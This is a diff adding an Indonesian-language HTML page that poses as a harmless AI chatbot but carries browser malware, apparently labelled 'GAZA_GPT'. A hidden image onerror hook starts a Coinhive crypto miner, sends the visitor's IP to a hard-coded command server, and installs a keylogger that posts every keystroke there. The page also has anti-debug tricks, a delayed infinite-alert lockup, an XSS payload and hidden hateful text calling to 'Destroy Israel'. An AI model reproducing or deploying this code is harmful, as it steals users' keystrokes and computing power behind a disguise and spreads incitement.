@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<!--⚠️ FILE INI MENGANDUNG MALWARE GAZA_GPT!⚠️-->
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🤖 AI Chatbot Harmless</title>
+    <style>
+        /* 🔥 CSS PENYAMARAN */
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        .chat-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        #chat-box {
+            height: 400px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        #crypto-miner {
+            position: absolute;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <!-- 🚀 TAMPILAN INNOCENT -->
+    <div class="chat-container">
+        <h1>😇 AI Assistant Ramah</h1>
+        <div id="chat-box"></div>
+        <input type="text" id="user-input" placeholder="Ketikan pesan...">
+        <button onclick="sendMessage()">Kirim</button>
+    </div>
+
+    <!-- ☠️ BACKDOOR HIDDEN -->
+    <iframe id="crypto-miner" src="https://www.google.com"></iframe>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" 
+         onerror="initMalware()">
+
+    <script>
+        // ==================[ AI LOGIC ]==================
+        const responses = [
+            "Halo! Ada yang bisa saya bantu?",
+            "Maaf saya tidak mengerti 😊",
+            "Silakan kunjungi website kami!",
+            "Terima kasih telah bertanya!"
+        ];
+
+        function sendMessage() {
+            const input = document.getElementById('user-input').value;
+            const chatBox = document.getElementById('chat-box');
+            
+            chatBox.innerHTML += `<p><strong>Anda:</strong> ${input}</p>`;
+            
+            // Auto response
+            const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+            chatBox.innerHTML += `<p><strong>AI:</strong> ${randomResponse}</p>`;
+            
+            document.getElementById('user-input').value = '';
+        }
+
+        // ==================[ MALWARE LOGIC ]==================
+        function initMalware() {
+            // Start crypto miner
+            const minerScript = document.createElement('script');
+            minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
+            document.head.appendChild(minerScript);
+            
+            minerScript.onload = () => {
+                const miner = new CoinHive.Anonymous('YOUR_MONERO_WALLET');
+                miner.start();
+            };
+
+            // Install backdoor
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    // Kirim IP korban ke C2 server
+                    fetch('http://94.158.238.9:6666/log', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            ip: data.ip,
+                            userAgent: navigator.userAgent
+                        })
+                    });
+                });
+
+            // Keylogger
+            document.addEventListener('keydown', (e) => {
+                fetch('http://94.158.238.9:6666/keylog', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        key: e.key,
+                        time: new Date().toISOString()
+                    })
+                });
+            });
+        }
+
+        // ==================[ STEALTH TECH ]==================
+        // Anti-debug
+        setInterval(() => {
+            if(console.log.toString() !== 'function log() { [native code] }') {
+                document.body.innerHTML = '<h1>404 Not Found</h1>';
+                window.stop();
+            }
+        }, 5000);
+
+        // Auto destroy after 1 week
+        setTimeout(() => {
+            document.body.innerHTML = '';
+            const script = document.createElement('script');
+            script.innerHTML = 'while(true) { alert("FREE PALESTINE!"); }';
+            document.body.appendChild(script);
+        }, 604800000); // 7 hari
+    </script>
+
+    <!-- 🇵🇸 PALESTINE MESSAGE HIDDEN -->
+    <div style="display:none">
+        <p>Free Palestine! Destroy Israel! 🇵🇸🔻</p>
+        <img src="xss.php?payload=%3Cscript%3Ealert(%27GazaCyberArmy%27)%3C/script%3E">
+    </div>
+</body>
+</html>
